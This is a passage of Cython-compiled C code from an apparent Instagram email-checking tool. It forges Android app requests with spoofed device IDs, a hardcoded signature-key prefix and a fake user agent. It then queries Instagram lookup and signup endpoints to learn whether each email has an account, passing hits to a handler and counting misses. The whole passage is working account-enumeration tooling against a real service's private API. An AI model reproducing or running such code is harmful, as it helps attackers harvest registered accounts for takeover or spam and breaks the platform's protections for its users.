        __pyx_t_1 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_8), NULL, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_2 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_8, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_1);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_hexdigest); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_4 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyObject_GetSlice(__pyx_t_4, 0, 16, NULL, NULL, &__pyx_slice__38, 0, 1, 1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 415, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

        
        __pyx_t_4 = PyNumber_Add(__pyx_kp_u_android, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 414, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_v_device_id = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_uuid); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 416, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 416, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_4 = (__pyx_t_7) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_7) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
        __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 416, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 416, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_v_uui = __pyx_t_2;
        __pyx_t_2 = 0;

        
        __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 418, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_User_Agent, __pyx_v_ua) < 0) __PYX_ERR(0, 418, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_kp_u_Content_Type, __pyx_kp_u_application_x_www_form_urlencode_3) < 0) __PYX_ERR(0, 418, __pyx_L9_error)
        __pyx_v_headers = ((PyObject*)__pyx_t_2);
        __pyx_t_2 = 0;

        
        __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 420, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_csrftoken, __pyx_v_csrftoken) < 0) __PYX_ERR(0, 420, __pyx_L9_error)
        __pyx_v_cookies = ((PyObject*)__pyx_t_2);
        __pyx_t_2 = 0;

        
        __pyx_t_2 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 421, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_json); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 421, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_dumps); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 421, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __pyx_t_7 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 422, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_csrftoken_2, __pyx_v_csrftoken) < 0) __PYX_ERR(0, 422, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_adid, __pyx_v_uui) < 0) __PYX_ERR(0, 422, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_guid_2, __pyx_v_uui) < 0) __PYX_ERR(0, 422, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_device_id_2, __pyx_v_device_id) < 0) __PYX_ERR(0, 422, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_u_query_2, __pyx_v_email) < 0) __PYX_ERR(0, 422, __pyx_L9_error)
        __pyx_t_8 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_4 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_7);
        __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 421, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_1 = PyNumber_Add(__pyx_kp_u_0d067c2f86cac2c17d655631c9cec240_2, __pyx_t_4); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 421, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_signed_body, __pyx_t_1) < 0) __PYX_ERR(0, 421, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_u_ig_sig_key_version, __pyx_kp_u_4) < 0) __PYX_ERR(0, 421, __pyx_L9_error)
        __pyx_v_data = ((PyObject*)__pyx_t_2);
        __pyx_t_2 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 423, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_post); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 423, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        
        __pyx_t_2 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 425, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 425, __pyx_L9_error)

        
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_cookies, __pyx_v_cookies) < 0) __PYX_ERR(0, 425, __pyx_L9_error)

        
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 425, __pyx_L9_error)

        
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_tuple__20, __pyx_t_2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 423, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_text); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 427, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_v_response = __pyx_t_2;
        __pyx_t_2 = 0;

        
        __pyx_t_15 = (__Pyx_PySequence_ContainsTF(__pyx_v_email, __pyx_v_response, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 428, __pyx_L9_error)
        __pyx_t_14 = (__pyx_t_15 != 0);
        if (__pyx_t_14) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_bunny); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 429, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_1 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_1)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_1);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
            }
          }
          __pyx_t_2 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_1, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_v_email);
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 429, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

          
          goto __pyx_L17;
        }

        
        /*else*/ {
          __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_kotu_insta); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 431, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_2);
          __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_t_2, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 431, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_kotu_insta, __pyx_t_4) < 0) __PYX_ERR(0, 431, __pyx_L9_error)
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __pyx_L17:;

        
        goto __pyx_L15;
      }

      
      __pyx_t_4 = __Pyx_PyInt_EqObjC(__pyx_v_method, __pyx_int_3, 3, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 432, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_4);
      __pyx_t_14 = __Pyx_PyObject_IsTrue(__pyx_t_4); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 432, __pyx_L9_error)
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      if (__pyx_t_14) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_requests); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 433, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_get); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 433, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
          if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_1, function);
          }
        }
        __pyx_t_4 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_1, __pyx_t_2, __pyx_kp_u_https_www_instagram_com_api_grap) : __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_kp_u_https_www_instagram_com_api_grap);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 433, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_v_responses = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_responses, __pyx_n_s_cookies); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 434, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 434, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_4 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 434, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_get); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 434, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_tuple__42, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 434, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_v_mid = __pyx_t_4;
        __pyx_t_4 = 0;

        
        __Pyx_INCREF(__pyx_kp_u_https_i_instagram_com_api_v1_acc_2);
        __pyx_v_url = __pyx_kp_u_https_i_instagram_com_api_v1_acc_2;

        
        __pyx_t_4 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 437, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_Host, __pyx_kp_u_i_instagram_com) < 0) __PYX_ERR(0, 437, __pyx_L9_error)

        
        __pyx_t_2 = __Pyx_PyObject_FormatSimple(__pyx_v_mid, __pyx_empty_unicode); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 438, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_1 = __Pyx_PyUnicode_Concat(__pyx_kp_u_mid_2, __pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 438, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_cookie, __pyx_t_1) < 0) __PYX_ERR(0, 437, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_capabilities, __pyx_kp_u_AQ) < 0) __PYX_ERR(0, 437, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_cookie2, __pyx_kp_u_Version_1) < 0) __PYX_ERR(0, 437, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_x_ig_connection_type, __pyx_n_u_WIFI) < 0) __PYX_ERR(0, 437, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_kp_u_user_agent, __pyx_kp_u_Instagram_136_0_0_34_124_Android) < 0) __PYX_ERR(0, 437, __pyx_L9_error)
        __pyx_v_headers = ((PyObject*)__pyx_t_4);
        __pyx_t_4 = 0;

        
        __pyx_t_4 = __Pyx_PyDict_NewPresized(5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 444, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_password, __pyx_n_u_Topython) < 0) __PYX_ERR(0, 444, __pyx_L9_error)

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_uuid); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 446, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 446, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
          }
        }
        __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 446, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 445, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_device_id_2, __pyx_t_7) < 0) __PYX_ERR(0, 444, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_uuid); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 448, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_1, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 448, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_2))) {
          __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_2);
          if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_2, function);
          }
        }
        __pyx_t_7 = (__pyx_t_1) ? __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_1) : __Pyx_PyObject_CallNoArg(__pyx_t_2);
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 448, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        
        __pyx_t_2 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_7); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 447, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_guid_2, __pyx_t_2) < 0) __PYX_ERR(0, 444, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_email, __pyx_v_email) < 0) __PYX_ERR(0, 444, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_u_username, __pyx_n_u_topython8786969_586) < 0) __PYX_ERR(0, 444, __pyx_L9_error)
        __pyx_v_data = ((PyObject*)__pyx_t_4);
        __pyx_t_4 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_requests); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 451, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 451, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 451, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_v_url);
        __Pyx_GIVEREF(__pyx_v_url);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v_url);
        __pyx_t_7 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 451, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_7);
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_headers, __pyx_v_headers) < 0) __PYX_ERR(0, 451, __pyx_L9_error)
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 451, __pyx_L9_error)
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_4, __pyx_t_7); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 451, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_v_response = __pyx_t_1;
        __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_text); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 452, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_14 = (__Pyx_PySequence_ContainsTF(__pyx_kp_u_Another_account_is_using_the_sam, __pyx_t_1, Py_EQ)); if (unlikely(__pyx_t_14 < 0)) __PYX_ERR(0, 452, __pyx_L9_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_15 = (__pyx_t_14 != 0);
        if (__pyx_t_15) {

          
          __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_bunny); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 453, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_4 = NULL;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_7))) {
            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_7);
            if (likely(__pyx_t_4)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
              __Pyx_INCREF(__pyx_t_4);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_7, function);
            }
          }
          __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_4, __pyx_v_email) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_v_email);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 453, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          
          goto __pyx_L18;
        }

        
        /*else*/ {
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_kotu_insta); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 455, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_7 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 455, __pyx_L9_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          if (PyDict_SetItem(__pyx_d, __pyx_n_s_kotu_insta, __pyx_t_7) < 0) __PYX_ERR(0, 455, __pyx_L9_error)
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        __pyx_L18:;

        
        goto __pyx_L15;
      }

      
      __pyx_t_7 = __Pyx_PyInt_EqObjC(__pyx_v_method, __pyx_int_4, 4, 0); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 456, __pyx_L9_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_15 = __Pyx_PyObject_IsTrue(__pyx_t_7); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 456, __pyx_L9_error)
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (__pyx_t_15) {

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_md5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 457, __pyx_L9_error)
        __Pyx_GOTREF(__pyx_t_4);
